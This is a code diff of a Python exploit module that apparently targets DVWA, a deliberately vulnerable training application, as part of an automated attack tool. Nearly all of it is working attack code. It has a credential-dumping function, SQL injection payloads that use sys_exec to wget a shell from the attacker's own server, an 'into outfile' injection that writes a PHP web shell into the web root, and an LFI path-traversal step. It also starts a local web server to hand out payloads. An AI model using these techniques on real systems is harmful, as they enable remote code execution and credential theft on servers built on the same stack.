@@ -1,11 +1,11 @@
 
 import requests
 import time
-import random
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin , urlparse , urlencode 
 from core.common import *
 from core.network import *
+
 
 def dump_creds(url,cookies,headers):
     payload = {
@@ -42,7 +42,7 @@ def dump_creds(url,cookies,headers):
 
 def to_rce(url,cookies,headers,server):
 
-    shell_name = str(random.randint(11111,99999))
+    shell_name = random_shell_name()
 
     payload = {
         "id" : f"-1' union select sys_exec(\"{wget_payload(lhost=server.host,lport=server.port,shell_name=shell_name)}\"),2 -- -",
@@ -56,7 +56,7 @@ def to_rce(url,cookies,headers,server):
     time.sleep(2)
 
     if 'FUNCTION dvwa.sys_exec does not exist' not in txtContent:
-        shell_path = urljoin(url,'vulnerabilities/sqli/' + shell_name + '.php')
+        shell_path = urljoin(url,'vulnerabilities/sqli/' + shell_name)
         check_exploit_succeed(shell_path,headers)
 
     else:
@@ -65,11 +65,11 @@ def to_rce(url,cookies,headers,server):
 
 def to_rce2(url,cookies,headers,server):
 
-    shell_name = str(random.randint(11111,99999))
+    shell_name = random_shell_name()
     shell = php_payload(server.host,server.port,shell_name).replace("'",'"')
 
     payload = {
-        "id" : f"-1' union select '{shell}',2 into outfile '/var/www/dvwa/{shell_name}.php' -- -",
+        "id" : f"-1' union select '{shell}',2 into outfile '/var/www/dvwa/{shell_name}' -- -",
         "Submit" : "Submit"
     }
 
@@ -79,7 +79,7 @@ def to_rce2(url,cookies,headers,server):
 
     if "Access denied" not in txtContent:
         time.sleep(2)
-        shell_path = urljoin(url, shell_name + '.php')
+        shell_path = urljoin(url, shell_name)
 
         if "Can't create/write" in txtContent:
             print(f"\t\t{txtContent.replace('</pre>','').replace('<pre>','')}")
@@ -94,7 +94,7 @@ def to_rce2(url,cookies,headers,server):
             # execute it to pull shell to the server with lfi exploit
             file = f"../../../../../../../../../tmp/{shell_name}.txt"
             lfi_request_file(url,cookies,headers,file)
-            shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name + '.php')
+            shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name)
 
 
         check_exploit_succeed(shell_path,headers)
@@ -109,13 +109,13 @@ def exploit(url,cookies = {}):
     print("Try Dvwa SQLi exploit :")
 
     # Handle Http Server
-    
     host = urlparse(url).hostname
-    headers = makeHeaders(host)
-    ip = ip_on_same_network(host) if ip_on_same_network(host) else get_public_ip()
+    ip = get_my_ip(host)
     port = 8000
     s = WebServer(ip,port)
     s.run()
+
+    headers = makeHeaders(host)
 
     # First techniqe
 
